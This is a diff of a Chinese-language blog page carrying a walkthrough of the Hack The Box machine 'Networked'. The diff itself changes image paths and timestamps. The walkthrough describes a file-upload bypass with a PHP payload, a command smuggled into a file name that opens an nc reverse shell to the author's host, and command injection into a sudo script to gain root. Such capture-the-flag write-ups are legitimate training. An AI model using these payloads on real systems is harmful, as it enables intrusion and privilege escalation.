@@ -14,15 +14,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="htb之Networkednmap 一波 10.10.10.146开放着80端口和22端口 目录扫描一下，直接把源码给扫出来了，直接就代码审查，只发现有一个上传功能抓包修改参数，没啥好说的，上传的艺术双重后缀，头文件绕过GIF89a喜获一个webshell，但是没什么用，user.txt都看不了，好吧起码撕开的一个口子打开/home发现有一个定时任务，还有一个PHP脚本，发现它会在一个目录下检测非">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://manmachines.github.io/2019/11/05/htb之Networked/images/g.png">
-<meta property="og:image" content="https://manmachines.github.io/2019/11/05/htb之Networked/images/w.png">
-<meta property="og:image" content="https://manmachines.github.io/2019/11/05/htb之Networked/images/e.png">
-<meta property="og:image" content="https://manmachines.github.io/2019/11/05/htb之Networked/images/r.png">
-<meta property="og:updated_time" content="2019-11-06T02:31:23.000Z">
+<meta property="og:image" content="https://manmachines.github.io/images/q.png">
+<meta property="og:image" content="https://manmachines.github.io/images/w.png">
+<meta property="og:image" content="https://manmachines.github.io/images/e.png">
+<meta property="og:image" content="https://manmachines.github.io/2019/11/05/htb之Networked/i/mages/r.png">
+<meta property="og:updated_time" content="2019-11-06T02:42:34.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="htb之Networked">
 <meta name="twitter:description" content="htb之Networkednmap 一波 10.10.10.146开放着80端口和22端口 目录扫描一下，直接把源码给扫出来了，直接就代码审查，只发现有一个上传功能抓包修改参数，没啥好说的，上传的艺术双重后缀，头文件绕过GIF89a喜获一个webshell，但是没什么用，user.txt都看不了，好吧起码撕开的一个口子打开/home发现有一个定时任务，还有一个PHP脚本，发现它会在一个目录下检测非">
-<meta name="twitter:image" content="https://manmachines.github.io/2019/11/05/htb之Networked/images/g.png">
+<meta name="twitter:image" content="https://manmachines.github.io/images/q.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -299,7 +299,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-11-06 10:31:23'>2019-11-05 15:10</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-06 10:42:34'>2019-11-05 15:10</time>
         
     </div>
     <div class="article-meta">
@@ -338,10 +338,10 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="htb之Networked"><a href="#htb之Networked" class="headerlink" title="htb之Networked"></a>htb之Networked</h1><p>nmap 一波 10.10.10.146<br>开放着80端口和22端口</p>
-<p>目录扫描一下，直接把源码给扫出来了，直接就代码审查，只发现有一个上传功能<br><img src="images/g.png" alt><br>抓包修改参数，没啥好说的，上传的艺术双重后缀，头文件绕过<br>GIF89a<?php phpinfo(); ?><br><img src="images/w.png" alt><br>喜获一个webshell，但是没什么用，user.txt都看不了，好吧起码撕开的一个口子<br>打开/home发现有一个定时任务，还有一个PHP脚本，发现它会在一个目录下检测非以IP命名的文件，检测到就rm掉<br>接下来就简单很多了，既然它检测，那我们就直接开个nc反弹shell<br>/var/www/html/uploads那我们就在这个目录下创建一个touch “;nc 10.10.15.149 3333 -c bash”<br>后台我们就以nc监听，变身用户权限，获得一个旗帜<br>接下就是提权了，常规的搜索提权信息sudo -l 看到一个bash脚本可以动用root权限，看来弱点就是在这了<br><img src="images/e.png" alt><br>ls -la 发现脚本是root权限所有，普通用户不能动只能执行，好吧，看看是啥内容<br>进去就发现一个正则表达式，好吧过滤掉大部分的符号，不过值得注意的是后面最后一行代码</p>
+<p>目录扫描一下，直接把源码给扫出来了，直接就代码审查，只发现有一个上传功能<br><img src="/images/q.png" alt><br>抓包修改参数，没啥好说的，上传的艺术双重后缀，头文件绕过<br>GIF89a<?php phpinfo(); ?><br><img src="/images/w.png" alt><br>喜获一个webshell，但是没什么用，user.txt都看不了，好吧起码撕开的一个口子<br>打开/home发现有一个定时任务，还有一个PHP脚本，发现它会在一个目录下检测非以IP命名的文件，检测到就rm掉<br>接下来就简单很多了，既然它检测，那我们就直接开个nc反弹shell<br>/var/www/html/uploads那我们就在这个目录下创建一个touch “;nc 10.10.15.149 3333 -c bash”<br>后台我们就以nc监听，变身用户权限，获得一个旗帜<br>接下就是提权了，常规的搜索提权信息sudo -l 看到一个bash脚本可以动用root权限，看来弱点就是在这了<br><img src="/images/e.png" alt><br>ls -la 发现脚本是root权限所有，普通用户不能动只能执行，好吧，看看是啥内容<br>进去就发现一个正则表达式，好吧过滤掉大部分的符号，不过值得注意的是后面最后一行代码</p>
 <blockquote>
 <pre><code>echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly</code></pre></blockquote>
-<p>输入成功之后它会直接写入另一个文件，啧啧，了解清楚之后就开撸吧<br>sudo ./changename.sh<br>然后直接命令注入吧，前缀随便填填个字母，绕过检测机制，如pp /bin/bash -i<br>提权成功<br><img src="images/r.png" alt></p>
+<p>输入成功之后它会直接写入另一个文件，啧啧，了解清楚之后就开撸吧<br>sudo ./changename.sh<br>然后直接命令注入吧，前缀随便填填个字母，绕过检测机制，如pp /bin/bash -i<br>提权成功<br><img src="i/mages/r.png" alt></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -355,7 +355,7 @@
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
     <p><span class="copy-title">发布时间:</span>2019-11-05, 15:10:35</p>
-    <p><span class="copy-title">最后更新:</span>2019-11-06, 10:31:23</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-06, 10:42:34</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/05/htb之Networked/" title="htb之Networked">https://manmachines.github.io/2019/11/05/htb之Networked/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
